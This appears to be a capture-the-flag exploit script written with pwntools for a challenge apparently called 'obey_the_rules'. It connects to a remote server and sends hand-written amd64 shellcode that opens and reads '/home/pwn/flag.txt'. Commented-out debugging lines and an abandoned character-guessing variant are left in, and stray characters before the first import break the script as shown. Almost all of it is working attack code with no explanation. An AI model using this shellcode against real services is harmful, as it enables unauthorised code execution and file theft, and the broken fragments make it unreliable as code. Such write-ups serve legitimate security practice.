ZZfrom pwn import *
#arg1 = int(sys.argv[1])
#arg2 = ord(sys.argv[2])
#if(len(sys.argv)>3):
#	arg3 = int(sys.argv[3])
#	if(arg3==1):
#		arg2 = ord(sys.argv[2].upper())
#print "index = " + str(arg1)
#print "char = " + str(arg2)
context.arch = 'amd64'
#s=process("./obey_the_rules")
s=remote("138.68.67.161", 20001)

#gdb.attach(s,"b*0x400e0a")
#gdb.attach(s,'b*0x0000000000400e0f\nc\nset $rax=0\nni\n')
shellcode = asm("""
		pop rsi
		xor edi, edi
                xor eax,eax
		syscall
		call rsi
		"""
		)

print len(shellcode)
#s.sendafter("Do you Obey? (yes / no)", "Y" + "\x00" + shellcode)



shellcode = asm("""
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
                pop rax
                pop rax
                pop rax
                pop rax
                pop rax
                cmp rax,{}
                je loop
		xor rax, rax
		push rax
		mov r9, 0x7478742e67616c66
		push r9
		mov r9, 0x2f6e77702f656d6f
		push r9
		mov cx, 0x682f
		push cx
		mov rdi, rsp
		xor esi, esi
		xor edx, edx
		mov al, 0x2
		syscall
		nop
                mov rdi, rax
                xor rsi,rsi
                inc rsi
                inc rsi
                xor eax,eax
                mov al,33
                syscall


		xor rdi,rdi
                inc rdi
                inc rdi
		xor eax, eax
		mov rsi, rsp
		mov rdx, 0x40
		syscall
		nop

                xor rdi,rdi
                mov rdi,0x1
                xor eax,eax
                mov al,0x1
                syscall
                loop: jmp loop
		""".format(sys.argv[1]))
"""

		mov r9, rsi
		add r9, {}
		mov al, {}
		cmp byte ptr [r9], al
		je correct
		jmp end

		correct: mov al, 0x59
		syscall

		end: int3
		ret

		nop
		.format(arg1, arg2))
                xor eax, eax
		mov al, 0x49
		syscall
		loop:jmp loop

"""

s.sendline(shellcode)

s.interactive()
